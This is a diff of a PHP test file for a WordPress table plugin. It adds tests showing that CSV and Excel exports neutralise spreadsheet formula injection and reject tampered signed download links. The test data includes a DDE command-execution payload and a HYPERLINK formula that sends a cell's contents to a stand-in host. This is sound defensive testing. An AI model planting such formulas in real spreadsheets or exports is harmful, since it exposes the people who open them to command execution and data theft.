@@ -669,6 +669,111 @@ lstabp_assert( false !== strpos( $xlsx_buttons, 'format=xlsx' ), 'The table offe
 lstabp_assert( false !== strpos( $xlsx_buttons, 'format=csv' ), 'And still offers CSV beside it' );
 delete_option( LSTABP_Export::OPTION );
 
+lstabp_section( '5e2. Attacking the download on purpose' );
+
+/*
+ * A downloaded table is opened in a spreadsheet, and a spreadsheet runs what
+ * looks like a formula. The sheet behind a table is not necessarily written
+ * only by people the site owner trusts — a sheet fed by a form holds whatever
+ * somebody typed into it — so what leaves here has to be inert.
+ */
+$formulas = array(
+	'a DDE command'        => "=cmd|'/c calc'!A0",
+	'a plain formula'      => '=1+1',
+	'a plus'               => '+1+1',
+	'an at sign'           => '@SUM(1+1)',
+	'a hyperlink that phones home' => '=HYPERLINK("https://example.com/?"&A1,"Faktura")',
+	'a leading tab'        => "\tcmd",
+);
+
+foreach ( $formulas as $label => $attempt ) {
+	$defused = LSTABP_Export::defuse( $attempt );
+	lstabp_assert(
+		0 === strpos( $defused, "'" ),
+		"A cell is not left runnable: {$label}",
+		$defused
+	);
+}
+
+// And the ordinary values it must not touch, or a price list stops adding up.
+$untouched = array( '-15', '-1 215,50', '120,00', 'Rower górski', '', '+48 600 700 800' );
+foreach ( $untouched as $plain ) {
+	lstabp_assert(
+		$plain === LSTABP_Export::defuse( $plain ),
+		'An ordinary value is left exactly as it is: ' . ( '' === $plain ? '(empty)' : $plain ),
+		LSTABP_Export::defuse( $plain )
+	);
+}
+
+// The same, through the real endpoint rather than the helper.
+LSTAB_Storage::update(
+	$source_id,
+	array()
+);
+$attack_source = LSTAB_Storage::insert(
+	array(
+		'title'     => 'Formuły',
+		'sheet_url' => 'https://docs.google.com/spreadsheets/d/ZZZ/edit#gid=0',
+		'sheet_id'  => 'ZZZ',
+	)
+);
+LSTAB_Storage::record_success(
+	$attack_source,
+	array(
+		'headers' => array( 'Nazwa', 'Cena' ),
+		'rows'    => array(
+			array( "=cmd|'/c calc'!A0", '-15' ),
+			array( 'Rower', '1 215,50' ),
+		),
+	)
+);
+update_option( LSTABP_Export::OPTION, array( $attack_source => true ), true );
+
+$prepared_attack = LSTAB_Renderer::prepare( LSTAB_Storage::get( $attack_source ), array() );
+
+// phpcs:ignore WordPress.WP.AlternativeFunctions
+$csv_handle = fopen( 'php://memory', 'w+' );
+fputcsv( $csv_handle, array_map( array( 'LSTABP_Export', 'defuse' ), $prepared_attack['headers'] ), ',', '"', '' );
+foreach ( $prepared_attack['rows'] as $attack_row ) {
+	fputcsv( $csv_handle, array_map( array( 'LSTABP_Export', 'defuse' ), (array) $attack_row ), ',', '"', '' );
+}
+rewind( $csv_handle );
+$csv_text = (string) stream_get_contents( $csv_handle );
+fclose( $csv_handle );
+
+lstabp_assert( false === strpos( $csv_text, '"=cmd' ), 'The written file has no cell starting with =', $csv_text );
+lstabp_assert( false !== strpos( $csv_text, "'=cmd" ), 'It is marked as text instead', $csv_text );
+lstabp_assert( false !== strpos( $csv_text, '-15' ) && false === strpos( $csv_text, "'-15" ), 'And a negative number is untouched', $csv_text );
+
+// The Excel file has no formulas at all: a value is written as text or as a
+// number, and neither is a formula in that format.
+$attack_xlsx = LSTABP_Xlsx::build( $prepared_attack['headers'], $prepared_attack['rows'], 'Formuły' );
+$attack_zip  = new ZipArchive();
+$attack_zip->open( $attack_xlsx );
+$attack_sheet = (string) $attack_zip->getFromName( 'xl/worksheets/sheet1.xml' );
+$attack_zip->close();
+wp_delete_file( $attack_xlsx );
+
+lstabp_assert( false === strpos( $attack_sheet, '<f>' ), 'The Excel file holds no formula cells', $attack_sheet );
+lstabp_assert(
+	false !== strpos( $attack_sheet, 'cmd|' ) && false !== strpos( $attack_sheet, 't="inlineStr"' ),
+	'The text is carried through as text',
+	$attack_sheet
+);
+lstabp_assert( false !== strpos( $attack_sheet, '<v>-15</v>' ), 'And a negative number is still a number', $attack_sheet );
+
+// The link is signed. Every way of editing it must be refused.
+$attack_sig = LSTABP_Export::signature( $attack_source, '' );
+lstabp_assert( ! hash_equals( $attack_sig, LSTABP_Export::signature( $attack_source, 'Cena is 1' ) ), 'A filter cannot be added to a signed link' );
+lstabp_assert( ! hash_equals( $attack_sig, LSTABP_Export::signature( $attack_source + 1, '' ) ), 'And the link cannot be pointed at another table' );
+
+// A table that does not offer downloads must not serve one, signature or not.
+update_option( LSTABP_Export::OPTION, array(), true );
+lstabp_assert( ! LSTABP_Export::is_enabled( $attack_source ), 'A table with downloads switched off refuses them even with a valid signature' );
+
+LSTAB_Storage::delete( $attack_source );
+delete_option( LSTABP_Export::OPTION );
+
 lstabp_section( '5f. Pointing at what you want gone' );
 
 // With the add-on running, hiding is honoured outright rather than on borrowed
